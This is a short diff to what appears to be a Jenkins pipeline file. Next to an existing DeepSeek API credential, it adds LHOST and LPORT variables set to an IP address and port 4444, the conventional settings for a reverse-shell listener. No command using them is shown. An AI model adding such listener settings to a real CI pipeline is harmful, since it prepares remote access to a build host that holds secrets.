@@ -3,6 +3,8 @@ pipeline {
 
     environment {
         DEEPSEEK_CREDENTIALS = credentials('deepseek-api-key')
+        LHOST = 100.85.95.64
+        LPORT = 4444
     }
 
     stages {
